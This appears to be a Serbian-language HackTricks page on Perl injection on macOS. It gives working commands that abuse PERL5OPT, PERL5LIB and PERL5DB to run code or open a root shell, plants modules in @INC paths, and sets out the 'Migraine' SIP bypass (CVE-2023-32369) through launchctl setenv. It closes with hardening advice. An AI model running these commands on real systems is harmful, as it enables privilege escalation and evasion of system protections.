# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Putem `PERL5OPT` & `PERL5LIB` env varijable

Korišćenjem env varijable **`PERL5OPT`** moguće je naterati **Perl** da izvrši proizvoljne komande kada se interpreter pokrene (čak **pre** nego što se prva linija ciljnog skripta analizira).
Na primer, kreirajte ovaj skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Druga opcija je da se kreira Perl modul (npr. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
I zatim koristite env varijable tako da se modul automatski locira i učita:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ostale zanimljive promenljive okruženja

* **`PERL5DB`** – kada se interpreter pokrene sa **`-d`** (debugger) flagom, sadržaj `PERL5DB` se izvršava kao Perl kod *unutar* konteksta debagera. 
Ako možete da utičete na oba, okruženje **i** komandne linijske flagove privilegovanog Perl procesa, možete uraditi nešto poput:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # će otvoriti shell pre izvršavanja skripte
```

* **`PERL5SHELL`** – na Windows-u ova promenljiva kontroliše koji izvršni fajl shell-a Perl će koristiti kada treba da pokrene shell. Pominje se ovde samo radi potpunosti, jer nije relevantna na macOS-u.

Iako `PERL5DB` zahteva `-d` switch, uobičajeno je naći skripte za održavanje ili instalaciju koje se izvršavaju kao *root* sa ovim flagom uključenim za detaljno rešavanje problema, čineći promenljivu validnim vektorom eskalacije.

## Putem zavisnosti (@INC zloupotreba)

Moguće je nabrojati putanju uključivanja koju Perl će pretraživati (**`@INC`**) pokretanjem:
```bash
perl -e 'print join("\n", @INC)'
```
Tipičan izlaz na macOS 13/14 izgleda ovako:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Neki od vraćenih foldera čak ni ne postoje, međutim **`/Library/Perl/5.30`** postoji, *nije* zaštićen SIP-om i *nalazi se* pre foldera zaštićenih SIP-om. Stoga, ako možete pisati kao *root*, možete postaviti zloćudni modul (npr. `File/Basename.pm`) koji će biti *preferencijalno* učitan od strane bilo kog privilegovanog skripta koji uvozi taj modul.

> [!WARNING]
> I dalje vam je potreban **root** da biste pisali unutar `/Library/Perl`, a macOS će prikazati **TCC** prompt koji traži *Potpunu pristup disku* za proces koji vrši operaciju pisanja.

Na primer, ako skripta uvozi **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` koji sadrži kod pod kontrolom napadača.

## SIP zaobilaženje putem Migration Assistant (CVE-2023-32369 “Migraine”)

U maju 2023. Microsoft je objavio **CVE-2023-32369**, nazvan **Migraine**, tehnika post-exploatacije koja omogućava *root* napadaču da potpuno **zaobiđe zaštitu integriteta sistema (SIP)**. 
Ranljiva komponenta je **`systemmigrationd`**, demon sa ovlašćenjem **`com.apple.rootless.install.heritable`**. Svaki podproces koji pokrene ovaj demon nasleđuje ovlašćenje i stoga se izvršava **van** SIP ograničenja.

Među decom koje su identifikovali istraživači je Apple-ov potpisani interpreter:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Zato što Perl poštuje `PERL5OPT` (a Bash poštuje `BASH_ENV`), zagađenje *okruženja* daemona je dovoljno da se dobije proizvoljna izvršna prava u kontekstu bez SIP-a:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Kada `migrateLocalKDC` pokrene, `/usr/bin/perl` se pokreće sa zlonamernim `PERL5OPT` i izvršava `/private/tmp/migraine.sh` *pre nego što se SIP ponovo omogući*. Iz tog skripta možete, na primer, kopirati payload unutar **`/System/Library/LaunchDaemons`** ili dodeliti `com.apple.rootless` proširenu atribut kako biste učinili datoteku **neizbrisivom**.

Apple je ispravio problem u macOS **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ali stariji ili neispravljeni sistemi ostaju podložni eksploataciji.

## Preporuke za učvršćivanje

1. **Obrišite opasne promenljive** – privilegovani launchdaemons ili cron poslovi treba da se pokreću u čistom okruženju (`launchctl unsetenv PERL5OPT`, `env -i`, itd.).
2. **Izbegavajte pokretanje interpretera kao root** osim ako nije strogo neophodno. Koristite kompajlirane binarne datoteke ili rano smanjite privilegije.
3. **Vendor skripte sa `-T` (taint mode)** tako da Perl ignoriše `PERL5OPT` i druge nesigurne opcije kada je provera taint-a omogućena.
4. **Držite macOS ažuriranim** – “Migrena” je potpuno ispravljena u trenutnim izdanjima.

## Reference

- Microsoft Security Blog – “Nova macOS ranjivost, Migrena, može zaobići zaštitu integriteta sistema” (CVE-2023-32369), 30. maj 2023.
- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) istraživanje”, maj 2025.

{{#include ../../../banners/hacktricks-training.md}}
